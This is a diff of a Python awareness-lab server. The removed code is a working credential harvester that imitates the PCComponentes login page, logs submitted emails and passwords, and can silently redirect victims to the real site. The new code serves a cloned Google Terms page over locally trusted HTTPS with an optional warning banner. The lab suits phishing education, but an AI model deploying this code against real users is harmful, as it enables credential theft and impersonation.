@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 """
-Local phishing-awareness lab server (Docker-friendly).
+Local site-cloning awareness lab server (Docker-friendly).
 
-Serves a LOOKALIKE of a well-known retailer's login page (PCComponentes)
-and logs any submitted credentials to captured.log. After a capture it
-either shows a "you were caught" reveal page (training mode) or silently
-redirects to the real site (LAB_REDIRECT_URL, realistic harvester mode).
+Serves a real 1:1 clone of a public page (by default Google's Terms of
+Service, cloned from https://policies.google.com/terms) from the ./site
+directory, over HTTPS with a certificate signed by YOUR local CA. The
+browser shows a valid padlock because that CA is installed in the trust
+store of your own machine — which is the whole lesson: the padlock proves
+the connection is encrypted to a server your device trusts, NOT that the
+site is the real one.
 
 Authorized use only:
   - Run it only inside a network you own, against test machines you control.
@@ -17,12 +20,14 @@ Usage:
 Environment:
   LAB_HOST           bind address (default 127.0.0.1)
   LAB_CERT, LAB_KEY  TLS cert/key files (HTTPS when both exist)
-  LAB_REDIRECT_URL   if set, POST gets a 302 to this URL instead of the
-                     reveal page
+  LAB_SITE_DIR       directory holding the cloned site (default ./site)
+  LAB_REDIRECT_URL   if set, GET / issues a 302 here instead of serving the
+                     clone (realistic "harvester" mode: the visitor is sent
+                     to the real page and never sees the clone)
 """
 import datetime
-import html
 import http.server
+import mimetypes
 import os
 import socketserver
 import ssl
@@ -33,180 +38,144 @@ import urllib.parse
 # Override with LAB_HOST=0.0.0.0 only for a deliberate LAN test.
 HOST = os.environ.get("LAB_HOST", "127.0.0.1")
 DEFAULT_PORT = 8080
-LOG_FILE = "captured.log"
+
+SITE_DIR = os.environ.get("LAB_SITE_DIR", "site")
+# Path (inside SITE_DIR) of the cloned page to serve as the root.
+LANDING_PAGE = "policies.google.com/terms.html"
 
 # If both files exist, the server serves over HTTPS. Generate them with mkcert
 # so the local CA is trusted and the browser shows a valid padlock.
 CERT_FILE = os.environ.get("LAB_CERT", "cert.pem")
 KEY_FILE = os.environ.get("LAB_KEY", "key.pem")
 
-# When set, submitted credentials are acknowledged with a 302 to this URL
-# (realistic harvester mode). When empty, the lab shows the reveal page.
+# When set, GET / returns a 302 to this URL instead of the clone (harvester
+# mode). When empty, the lab serves the clone itself.
 REDIRECT_URL = os.environ.get("LAB_REDIRECT_URL", "")
 
-LOGIN_PAGE = """<!DOCTYPE html>
-<!-- LAB-ONLY credential-harvester clone. Never serve outside your own test network. -->
-<html lang="es">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Inicia sesi&oacute;n | PCComponentes</title>
-  <style>
-    :root { color-scheme: light; --brand:#e5142c; --brand-dark:#7f1d1d; --ink:#1f2937; --muted:#6b7280; --line:#e5e7eb; }
-    * { box-sizing: border-box; margin: 0; }
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif; color: var(--ink); background: #fff; }
-    .topbar { background: var(--brand); color: #fff; padding: 14px 24px; display: flex; gap: 18px; align-items: center; flex-wrap: wrap; }
-    .logo { font-size: 21px; font-weight: 800; letter-spacing: .4px; white-space: nowrap; }
-    .search { flex: 1; min-width: 220px; display: flex; }
-    .search input { flex: 1; padding: 9px 12px; border: 0; border-radius: 4px 0 0 4px; font-size: 14px; }
-    .search button { padding: 9px 14px; border: 0; border-radius: 0 4px 4px 0; background: var(--brand-dark); color: #fff; cursor: pointer; font-size: 14px; }
-    .toplinks { font-size: 13px; white-space: nowrap; }
-    .toplinks span { margin-left: 14px; }
-    .cats { border-bottom: 1px solid var(--line); padding: 10px 24px; font-size: 13px; color: var(--muted); }
-    .cats span { margin-right: 18px; }
-    main { display: flex; justify-content: center; gap: 20px; padding: 44px 24px; flex-wrap: wrap; background: #fafafa; }
-    .card { background: #fff; border: 1px solid var(--line); border-radius: 8px; padding: 28px; width: 100%; max-width: 360px; height: fit-content; }
-    h1 { font-size: 20px; margin-bottom: 4px; }
-    .sub { font-size: 13px; color: var(--muted); margin-bottom: 14px; }
-    label { display: block; font-size: 13px; margin: 14px 0 6px; }
-    input[type=email], input[type=password] {
-      width: 100%; padding: 11px 12px; border: 1px solid #d1d5db; border-radius: 5px; font-size: 15px;
-    }
-    input[type=email]:focus, input[type=password]:focus { outline: 2px solid var(--brand); border-color: var(--brand); }
-    button.submit {
-      width: 100%; margin-top: 20px; padding: 12px; border: 0; border-radius: 5px;
-      background: var(--brand); color: #fff; font-size: 15px; font-weight: 600; cursor: pointer;
-    }
-    button.submit:hover { background: #c31124; }
-    .help { margin-top: 14px; text-align: center; font-size: 13px; }
-    .help a { color: var(--brand); text-decoration: none; }
-    .side { width: 100%; max-width: 300px; height: fit-content; }
-    .panel { background: #fff; border: 1px solid var(--line); border-radius: 8px; padding: 22px; margin-bottom: 16px; font-size: 14px; line-height: 1.55; }
-    .panel b { display: block; margin-bottom: 6px; }
-    .panel a { color: var(--brand); text-decoration: none; font-weight: 600; }
-    footer { padding: 16px 24px; border-top: 1px solid var(--line); color: #9ca3af; font-size: 11px; text-align: center; }
-  </style>
-</head>
-<body>
-  <div class="topbar">
-    <span class="logo">PCComponentes</span>
-    <div class="search">
-      <input type="text" placeholder="Buscar productos" aria-label="Buscar">
-      <button type="button">Buscar</button>
-    </div>
-    <div class="toplinks"><span>Mi cuenta</span><span>Carrito</span></div>
-  </div>
-  <div class="cats">
-    <span>Componentes</span><span>Port&aacute;tiles</span><span>Smartphones</span>
-    <span>Perif&eacute;ricos</span><span>Gaming</span><span>Ofertas</span>
-  </div>
-  <main>
-    <form class="card" method="POST" action="/login">
-      <h1>Inicia sesi&oacute;n</h1>
-      <p class="sub">Accede con tu cuenta para continuar</p>
-      <label for="email">Email</label>
-      <input id="email" name="email" type="email" autocomplete="username" required>
-      <label for="password">Contrase&ntilde;a</label>
-      <input id="password" name="password" type="password" autocomplete="current-password" required>
-      <button class="submit" type="submit">Entrar</button>
-      <div class="help"><a href="#">&iquest;Has olvidado tu contrase&ntilde;a?</a></div>
-    </form>
-    <aside class="side">
-      <div class="panel">
-        <b>&iquest;Todav&iacute;a no tienes cuenta?</b>
-        Reg&iacute;strate y accede a ofertas exclusivas, seguimiento de pedidos
-        y facturas. <a href="#">Crear cuenta</a>
-      </div>
-      <div class="panel">
-        <b>Compra segura</b>
-        Pago protegido, env&iacute;o en 24 h y devoluciones gratuitas.
-      </div>
-    </aside>
-  </main>
-  <footer>Clon de laboratorio con fines educativos — sin relaci&oacute;n con PCComponentes</footer>
-</body>
-</html>"""
+# Injected into every served HTML page so the lab operator (and any test
+# "victim") can tell at a glance this is the clone, not the real page.
+# Set LAB_BANNER=0 to disable (e.g. for a blind harvester test).
+BANNER_ENABLED = os.environ.get("LAB_BANNER", "1") != "0"
 
-RESULT_PAGE = """<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Clon de laboratorio</title>
-  <style>
-    body {
-      margin: 0; min-height: 100vh; display: flex; align-items: center;
-      justify-content: center; font-family: system-ui, Arial, sans-serif;
-      background: #7f1d1d;
-    }
-    .card {
-      max-width: 460px; margin: 24px; padding: 32px; background: #fff;
-      border-radius: 10px; box-shadow: 0 12px 40px rgba(0,0,0,.35);
-    }
-    h1 { color: #b91c1c; margin: 0 0 12px; font-size: 20px; }
-    p { color: #374151; line-height: 1.5; }
-    code { background: #f3f4f6; padding: 2px 6px; border-radius: 4px; }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h1>&#9888; Has iniciado sesi&oacute;n en el CLON del laboratorio</h1>
-    <p>Esta NO es la p&aacute;gina real de PCComponentes: navegaste hacia un
-       servidor de pruebas de tu propia red.</p>
-    <p>El email <code>{{USER}}</code> y su contrase&ntilde;a acaban de quedar
-       registrados en <code>captured.log</code> del servidor.</p>
-    <p>Fin del ejercicio. Lecci&oacute;n: el candado HTTPS solo garantiza que la
-       conexi&oacute;n va cifrada hacia un servidor cuya CA conf&iacute;a tu
-       dispositivo — no que el sitio sea leg&iacute;timo.</p>
-  </div>
-</body>
-</html>"""
+BANNER_HTML = (
+    "<div style=\"position:fixed;top:0;left:0;right:0;z-index:2147483647;"
+    "background:#b91c1c;color:#fff;font:600 14px/1.4 system-ui,Arial,sans-serif;"
+    "text-align:center;padding:8px 16px;\">"
+    "&#9888; CLON DE LABORATORIO &mdash; p&aacute;gina clonada con fines educativos, "
+    "NO es policies.google.com real</div>"
+)
+
+# Request log (one line per GET) — keeps a local record of what was fetched.
+ACCESS_LOG = "access.log"
 
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
-        # Any path returns the login page, mimicking a portal that always
-        # redirects unauthenticated users to the login screen.
-        self._send_html(LOGIN_PAGE)
-
-    def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(length).decode("utf-8", "replace")
-        fields = urllib.parse.parse_qs(body)
-        email = fields.get("email", fields.get("username", [""]))[0]
-        password = fields.get("password", [""])[0]
-        self._log(email, password)
-        if REDIRECT_URL:
+        if REDIRECT_URL and self.path in ("/", "/index.html"):
             self.send_response(302)
             self.send_header("Location", REDIRECT_URL)
+            self.send_header("Content-Length", "0")
             self.end_headers()
+            self._log(f"302 -> {REDIRECT_URL}")
             return
-        page = RESULT_PAGE.replace("{{USER}}", html.escape(email) or "(vacío)")
-        self._send_html(page)
 
-    def _log(self, email, password):
-        stamp = datetime.datetime.now().isoformat(timespec="seconds")
-        line = f"{stamp}\t{self.client_address[0]}\temail={email!r}\tpass={password!r}\n"
-        with open(LOG_FILE, "a", encoding="utf-8") as fh:
-            fh.write(line)
-        print("[CAPTURED] " + line.strip(), flush=True)
+        target = self._resolve_path(self.path)
+        if target is None:
+            self.send_error(404, "Not Found")
+            self._log("404")
+            return
 
-    def _send_html(self, body):
-        data = body.encode("utf-8")
+        ctype = mimetypes.guess_type(target)[0] or "application/octet-stream"
+        is_html = ctype == "text/html"
+        # The cloned files are UTF-8. Declaring the charset is what keeps
+        # UTF-8 punctuation (e.g. the right single quote ’ in "What’s")
+        # from being misdecoded as Windows-1252 into mojibake like "â€™".
+        if ctype.startswith("text/") or ctype in ("application/javascript",
+                                                  "application/json",
+                                                  "application/xml"):
+            ctype += "; charset=utf-8"
+        try:
+            with open(target, "rb") as fh:
+                data = fh.read()
+        except OSError:
+            self.send_error(404, "Not Found")
+            self._log("404")
+            return
+
+        # Inject the lab banner into HTML pages so the clone is unmistakable.
+        if BANNER_ENABLED and is_html:
+            data = self._inject_banner(data)
+
         self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Type", ctype)
         self.send_header("Content-Length", str(len(data)))
         self.end_headers()
         self.wfile.write(data)
+        self._log(f"200 {ctype}")
+
+    def _inject_banner(self, data):
+        """Insert the clone banner right after <body ...> (or prepend)."""
+        banner = BANNER_HTML.encode("utf-8")
+        lower = data.lower()
+        idx = lower.find(b"<body")
+        if idx != -1:
+            close = lower.find(b">", idx)
+            if close != -1:
+                return data[: close + 1] + banner + data[close + 1 :]
+        return banner + data
+
+    def _resolve_path(self, raw_path):
+        """Map a request path to a file under SITE_DIR, or None.
+
+        The clone is laid out by domain (wget --mirror): the landing page
+        lives at SITE_DIR/policies.google.com/terms.html and its assets are
+        referenced with paths like /www.gstatic.com/... so we serve SITE_DIR
+        as the document root and alias the root URL to the landing page.
+        """
+        path, _, query = raw_path.partition("?")
+        path = urllib.parse.unquote(path)
+
+        if path in ("/", "/index.html", "/terms", "/terms.html"):
+            candidate = os.path.join(SITE_DIR, LANDING_PAGE)
+            return candidate if os.path.isfile(candidate) else None
+
+        # Strip a leading slash and resolve relative to SITE_DIR.
+        rel = path.lstrip("/") or LANDING_PAGE
+        candidate = os.path.join(SITE_DIR, rel)
+
+        # wget --adjust-extension names query-variant files literally with a
+        # '?' in the filename (e.g. "index.html?lfhs=2.html"). Fall back to
+        # that literal form when the plain path is missing.
+        if os.path.isfile(candidate):
+            return candidate
+        if query and os.path.isfile(candidate + "?" + query):
+            return candidate + "?" + query
+        # Directory -> index.html
+        if os.path.isdir(candidate):
+            idx = os.path.join(candidate, "index.html")
+            if os.path.isfile(idx):
+                return idx
+        return None
+
+    def _log(self, what):
+        stamp = datetime.datetime.now().isoformat(timespec="seconds")
+        line = f"{stamp}\t{self.client_address[0]}\t{self.path}\t{what}\n"
+        with open(ACCESS_LOG, "a", encoding="utf-8") as fh:
+            fh.write(line)
+        print(f"[GET] {self.path} -> {what}", flush=True)
 
     def log_message(self, *args):
-        pass  # Silence default request logging; captures are printed explicitly.
+        pass  # Silence default request logging; our own _log is explicit.
 
 
 def main():
     tls = os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)
     default_port = 8443 if tls else DEFAULT_PORT
     port = int(sys.argv[1]) if len(sys.argv) > 1 else default_port
+
+    if not os.path.isdir(SITE_DIR):
+        print(f"error: {SITE_DIR}/ not found — run ./clone.sh first", file=sys.stderr)
+        sys.exit(1)
 
     socketserver.ThreadingTCPServer.allow_reuse_address = True
     httpd = socketserver.ThreadingTCPServer((HOST, port), Handler)
@@ -219,7 +188,8 @@ def main():
 
     with httpd:
         print(f"Lab clone serving on {scheme}://{HOST}:{port}  (Ctrl+C to stop)")
-        print(f"Captured credentials are appended to ./{LOG_FILE}")
+        print(f"Cloned site root: ./{SITE_DIR}")
+        print(f"Requests are appended to ./{ACCESS_LOG}")
         try:
             httpd.serve_forever()
         except KeyboardInterrupt:
